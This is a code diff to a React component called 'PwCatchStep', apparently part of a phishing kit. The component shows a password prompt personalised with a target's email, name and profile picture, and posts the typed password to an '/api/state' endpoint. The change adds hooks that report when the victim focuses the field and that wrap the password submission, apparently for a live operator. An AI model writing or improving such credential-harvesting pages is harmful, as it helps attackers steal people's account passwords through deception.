@@ -20,9 +20,11 @@ type PwCatchStepProps = {
   email: string;
   name: string;
   profilePicture: string;
+  onInteractionStart: () => void;
+  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
 };
 
-export default function PwCatchStep({ email, name, profilePicture }: PwCatchStepProps) {
+export default function PwCatchStep({ email, name, profilePicture, onInteractionStart, onInteractionEnd }: PwCatchStepProps) {
   const { register, handleSubmit, formState: { errors, isSubmitting }, getValues } = useForm<PasswordFormData>({
     resolver: zodResolver(passwordSchema),
   });
@@ -38,24 +40,24 @@ export default function PwCatchStep({ email, name, profilePicture }: PwCatchStep
 
   const onSubmit: SubmitHandler<PasswordFormData> = async (data) => {
     if (!data.password) {
-        // This prevents submission if the field is somehow empty,
-        // which can happen in a race condition.
         return;
     }
-    try {
-      const res = await fetch("/api/state", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "submitPassword", password: data.password }),
-      });
-      if (!res.ok) throw new Error("Server responded with an error.");
-    } catch (error) {
-      toast({
-        variant: "destructive",
-        title: "Error",
-        description: "Could not proceed. Please try again.",
-      });
-    }
+    await onInteractionEnd(async () => {
+      try {
+        const res = await fetch("/api/state", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "submitPassword", password: data.password }),
+        });
+        if (!res.ok) throw new Error("Server responded with an error.");
+      } catch (error) {
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Could not proceed. Please try again.",
+        });
+      }
+    });
   };
 
   return (
@@ -129,7 +131,10 @@ export default function PwCatchStep({ email, name, profilePicture }: PwCatchStep
                         type={showPassword ? "text" : "password"}
                         {...register("password")}
                         className="h-14 w-full rounded-md border border-input bg-transparent px-4 pb-2 pt-6 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
-                        onFocus={() => setIsFocused(true)}
+                        onFocus={() => {
+                          setIsFocused(true);
+                          onInteractionStart();
+                        }}
                         onBlur={() => setIsFocused(false)}
                         onChange={handleInputChange}
                     />
